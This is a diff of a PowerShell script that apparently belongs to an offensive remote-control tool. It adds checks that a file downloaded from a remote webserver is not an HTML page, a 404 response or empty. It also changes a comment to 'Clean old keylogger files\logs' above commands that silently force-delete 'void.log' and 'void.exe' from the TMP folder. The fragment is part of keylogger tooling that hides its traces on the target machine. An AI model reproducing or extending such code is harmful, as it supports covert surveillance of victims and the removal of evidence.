@@ -216,12 +216,22 @@ If($SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -or $Sessions -ne 'Fal
 
    ## Make sure that the download file its not a 'DOCTYPE html' document
    If(-not($FileName -iMatch '[.exe]$')){## This test does not work on binary files (.exe)
-      $Status = Get-Content -Path "$Initial_Path\$FileName"
-      If($Status -iMatch '^(<!DOCTYPE html)' -or $Status -iMatch '^(404)'){
+      $Status = Get-Content -Path "$Initial_Path\$FileName" -EA SilentlyContinue
+      If($Status -iMatch '^(<!DOCTYPE html)'){
          Write-Host "[abort] $FileName download corrupted (DOCTYPE html)" -ForeGroundColor Red -BackGroundColor Black
          Write-Host "";Start-Sleep -Seconds 1;exit ## exit @webserver
+      }ElseIf($Status -iMatch '^(404)'){
+         Write-Host "[abort] $FileName not found in remote server (404)" -ForeGroundColor Red -BackGroundColor Black
+         Write-Host "";Start-Sleep -Seconds 1;exit ## exit @webserver
+      }ElseIf($Status -ieq $Null){
+         Write-Host "[abort] $FileName not found in remote server (`$Null)" -ForeGroundColor Red -BackGroundColor Black
+         Write-Host "";Start-Sleep -Seconds 1;exit ## exit @webserver
+      }Else{
+         ## File successfuly Downloaded
+         $Success = $True
       }
    }
+
 
    ## Build Object-Table Display
    If(Test-Path -Path "$Initial_Path\$FileName"){
@@ -505,7 +515,7 @@ $Timer = Get-Date -Format 'HH:mm:ss'
       }
 
       write-host ""
-      ## Clean old files
+      ## Clean old keylogger files\logs
       Remove-Item -Path "$Env:TMP\void.log" -EA SilentlyContinue -Force
       Remove-Item -Path "$Env:TMP\void.exe" -EA SilentlyContinue -Force
       Start-Sleep -Milliseconds 600;exit ## exit @webserver
